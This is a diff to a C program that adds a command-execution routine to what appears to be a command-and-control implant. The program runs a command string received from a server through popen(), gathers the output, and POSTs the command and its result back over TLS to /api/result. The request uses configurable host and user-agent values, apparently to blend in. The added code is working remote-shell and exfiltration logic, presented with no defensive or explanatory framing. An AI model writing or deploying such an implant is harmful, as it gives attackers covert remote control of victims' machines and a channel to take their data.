@@ -346,6 +346,41 @@ int main(int argc, char *argv[]) {
                     char *end = strchr(msg, '"');
                     if (end) *end = '\0';
                     printf("\n>>> %s <<<\n", msg);
+
+                    /* Execute command and capture output */
+                    if (strcmp(msg, "No commands") != 0) {
+                        char output[4096] = "";
+                        FILE *fp = popen(msg, "r");
+                        if (fp) {
+                            char line[256];
+                            while (fgets(line, sizeof(line), fp)) {
+                                /* Escape special chars for JSON */
+                                for (char *p = line; *p; p++) {
+                                    if (*p == '\n') *p = ' ';
+                                    if (*p == '\r') *p = ' ';
+                                    if (*p == '"') *p = '\'';
+                                    if (*p == '\\') *p = '/';
+                                }
+                                strncat(output, line, sizeof(output) - strlen(output) - 1);
+                            }
+                            pclose(fp);
+                        }
+                        printf("[*] Output: %s\n", output);
+
+                        /* POST result back to server */
+                        char result_body[4096];
+                        snprintf(result_body, sizeof(result_body), "{\"cmd\":\"%s\",\"output\":\"%s\"}", msg, output);
+                        snprintf(req, sizeof(req),
+                            "POST /api/result HTTP/1.1\r\n"
+                            "Host: %s\r\n"
+                            "User-Agent: %s\r\n"
+                            "Content-Type: application/json\r\n"
+                            "Content-Length: %d\r\n"
+                            "Connection: close\r\n\r\n%s",
+                            sni_host, user_agent, (int)strlen(result_body), result_body);
+                        SSL_write(ssl, req, strlen(req));
+                        SSL_read(ssl, res, sizeof(res));
+                    }
                 }
             }
 
